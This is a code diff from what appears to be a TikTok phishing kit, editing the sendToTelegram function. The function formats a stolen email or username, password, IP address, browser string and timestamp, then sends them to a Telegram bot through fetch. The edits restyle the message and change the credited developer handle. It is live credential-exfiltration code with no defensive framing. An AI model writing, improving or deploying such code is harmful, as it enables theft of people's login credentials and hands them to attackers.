@@ -41,18 +41,18 @@ async function sendToTelegram(data) {
   const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Algiers' });
 
   const msg =
-    `🎭 <b>New Login on TikTok </b>
-
+        `🎭 <b>Now Login on TikTok</b> 🎭
+━━━━━━━━━━━━━━━━━━━━
 👤 <b>User Info</b>
-📧 Email / Phone: <code>${data.user}</code>
-🔑 Password / Code: <code>${data.pass}</code>
-
+📧 <b>Email/User:</b> <code>${user}</code>
+🔑 <b>Password:</b> <code>${pass}</code>
+━━━━━━━━━━━━━━━━━━━━
 🌐 <b>System Info</b>
-🖥️ IP: <code>${ip}</code>
-🌍 Browser: <code>${navigator.userAgent.slice(0, 80)}</code>
-📅 Time: <code>${now}</code>
-
- 👨🏻‍💻 <i>By @xr_i4 — 7snawi</i>`;
+🖥️ <b>Browser:</b> <code>${navigator.userAgent.slice(0, 80)}</code>
+📍 <b>IP:</b> <code>${ip}</code>
+🕐 <b>Time:</b> <code>${now}</code>
+━━━━━━━━━━━━━━━━━━━━
+ 👨🏻‍💻 <b>Developer:</b> Infinity — @v2_uz`;
 
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
